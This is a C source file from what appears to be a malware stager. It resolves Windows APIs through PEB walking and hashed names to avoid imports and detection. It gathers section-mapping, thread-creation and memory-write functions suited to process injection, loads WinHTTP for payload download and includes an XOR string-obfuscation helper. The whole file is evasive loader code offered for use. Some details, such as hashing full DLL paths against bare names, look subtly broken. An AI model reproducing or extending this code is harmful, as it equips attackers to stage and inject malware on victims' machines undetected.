/*
 * PEB Walking + Hash-based API Resolution
 * No imports required — everything resolved at runtime.
 */

#include "stager.h"

/* ============================================
 * FNV-1a hash (32-bit)
 * ============================================ */
UINT32 Fnv1aHash(const char *str)
{
    UINT32 h = 0x811c9dc5;
    while (*str) {
        h ^= (UINT8)(*str++);
        h *= 0x01000193;
    }
    return h;
}

/* ============================================
 * Get module base from PEB by hash
 * ============================================ */
static HMODULE GetModuleByHash(UINT32 modHash)
{
#ifdef _WIN64
    PPEB peb = (PPEB)__readgsqword(0x60);
#else
    PPEB peb = (PPEB)__readfsdword(0x30);
#endif
    PPEB_LDR_DATA ldr = peb->Ldr;
    PLDR_DATA_TABLE_ENTRY entry = (PLDR_DATA_TABLE_ENTRY)ldr->InMemoryOrderModuleList.Flink;

    while (entry != (PLDR_DATA_TABLE_ENTRY)&ldr->InMemoryOrderModuleList) {
        WCHAR *name = entry->FullDllName.Buffer;
        if (name) {
            char ansi[128] = {0};
            int i = 0;
            while (name[i] && i < 127) {
                ansi[i] = (char)(name[i] >= 'A' && name[i] <= 'Z' ? name[i] + 32 : name[i]);
                i++;
            }
            if (Fnv1aHash(ansi) == modHash) {
                return (HMODULE)entry->DllBase;
            }
        }
        entry = (PLDR_DATA_TABLE_ENTRY)entry->InMemoryOrderLinks.Flink;
    }
    return NULL;
}

/* ============================================
 * Resolve function address by hash
 * ============================================ */
PVOID ResolveApiByHash(HMODULE hMod, UINT32 hash)
{
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hMod;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)hMod + dos->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hMod +
        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD *names = (DWORD*)((BYTE*)hMod + exp->AddressOfNames);
    DWORD *funcs = (DWORD*)((BYTE*)hMod + exp->AddressOfFunctions);
    WORD *ords  = (WORD*)((BYTE*)hMod + exp->AddressOfNameOrdinals);

    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        char *name = (char*)((BYTE*)hMod + names[i]);
        if (Fnv1aHash(name) == hash) {
            return (PVOID)((BYTE*)hMod + funcs[ords[i]]);
        }
    }
    return NULL;
}

/* ============================================
 * Resolve all APIs we need
 * ============================================ */
BOOL ResolveApis(PAPI_TABLE Api)
{
    HMODULE hNtdll    = GetModuleByHash(Fnv1aHash("ntdll.dll"));
    HMODULE hKernel32 = GetModuleByHash(Fnv1aHash("kernel32.dll"));
    HMODULE hWinHttp  = NULL;

    if (!hNtdll || !hKernel32) return FALSE;

    /* ntdll */
    Api->LdrLoadDll              = (pLdrLoadDll)ResolveApiByHash(hNtdll, Fnv1aHash("LdrLoadDll"));
    Api->NtCreateSection         = (pNtCreateSection)ResolveApiByHash(hNtdll, Fnv1aHash("NtCreateSection"));
    Api->NtMapViewOfSection      = (pNtMapViewOfSection)ResolveApiByHash(hNtdll, Fnv1aHash("NtMapViewOfSection"));
    Api->NtUnmapViewOfSection    = (pNtUnmapViewOfSection)ResolveApiByHash(hNtdll, Fnv1aHash("NtUnmapViewOfSection"));
    Api->NtCreateThreadEx        = (pNtCreateThreadEx)ResolveApiByHash(hNtdll, Fnv1aHash("NtCreateThreadEx"));
    Api->NtQueryInformationProcess = (pNtQueryInformationProcess)ResolveApiByHash(hNtdll, Fnv1aHash("NtQueryInformationProcess"));
    Api->RtlCreateUserThread     = (pRtlCreateUserThread)ResolveApiByHash(hNtdll, Fnv1aHash("RtlCreateUserThread"));
    Api->NtAllocateVirtualMemory = (pNtAllocateVirtualMemory)ResolveApiByHash(hNtdll, Fnv1aHash("NtAllocateVirtualMemory"));
    Api->NtProtectVirtualMemory  = (pNtProtectVirtualMemory)ResolveApiByHash(hNtdll, Fnv1aHash("NtProtectVirtualMemory"));
    Api->NtWriteVirtualMemory    = (pNtWriteVirtualMemory)ResolveApiByHash(hNtdll, Fnv1aHash("NtWriteVirtualMemory"));
    Api->NtClose                 = (pNtClose)ResolveApiByHash(hNtdll, Fnv1aHash("NtClose"));
    Api->NtDelayExecution        = (pNtDelayExecution)ResolveApiByHash(hNtdll, Fnv1aHash("NtDelayExecution"));

    /* kernel32 */
    Api->CreateProcessW = (pCreateProcessW)ResolveApiByHash(hKernel32, Fnv1aHash("CreateProcessW"));
    Api->ExitProcess    = (pExitProcess)ResolveApiByHash(hKernel32, Fnv1aHash("ExitProcess"));
    Api->VirtualAlloc   = (pVirtualAlloc)ResolveApiByHash(hKernel32, Fnv1aHash("VirtualAlloc"));
    Api->VirtualFree    = (pVirtualFree)ResolveApiByHash(hKernel32, Fnv1aHash("VirtualFree"));
    Api->VirtualProtect = (pVirtualProtect)ResolveApiByHash(hKernel32, Fnv1aHash("VirtualProtect"));

    /* Load winhttp.dll manually */
    WCHAR wWinHttp[] = { 'w','i','n','h','t','t','p','.','d','l','l',0 };
    UNICODE_STRING ustr = { sizeof(wWinHttp)-2, sizeof(wWinHttp), wWinHttp };
    HANDLE hWinHttpHandle = NULL;
    Api->LdrLoadDll(NULL, 0, &ustr, &hWinHttpHandle);
    hWinHttp = (HMODULE)hWinHttpHandle;

    if (hWinHttp) {
        Api->WinHttpOpen            = (pWinHttpOpen_t)ResolveApiByHash(hWinHttp, Fnv1aHash("WinHttpOpen"));
        Api->WinHttpConnect         = (pWinHttpConnect_t)ResolveApiByHash(hWinHttp, Fnv1aHash("WinHttpConnect"));
        Api->WinHttpOpenRequest     = (pWinHttpOpenRequest_t)ResolveApiByHash(hWinHttp, Fnv1aHash("WinHttpOpenRequest"));
        Api->WinHttpSendRequest     = (pWinHttpSendRequest_t)ResolveApiByHash(hWinHttp, Fnv1aHash("WinHttpSendRequest"));
        Api->WinHttpReceiveResponse = (pWinHttpReceiveResponse_t)ResolveApiByHash(hWinHttp, Fnv1aHash("WinHttpReceiveResponse"));
        Api->WinHttpReadData        = (pWinHttpReadData_t)ResolveApiByHash(hWinHttp, Fnv1aHash("WinHttpReadData"));
        Api->WinHttpQueryHeaders    = (pWinHttpQueryHeaders_t)ResolveApiByHash(hWinHttp, Fnv1aHash("WinHttpQueryHeaders"));
        Api->WinHttpCloseHandle     = (pWinHttpCloseHandle_t)ResolveApiByHash(hWinHttp, Fnv1aHash("WinHttpCloseHandle"));
    }

    return (Api->NtCreateSection && Api->NtMapViewOfSection && Api->CreateProcessW);
}

void _xor_str(char *buf, SIZE_T len, BYTE key)
{
    for (SIZE_T i = 0; i < len; i++) buf[i] ^= key;
}
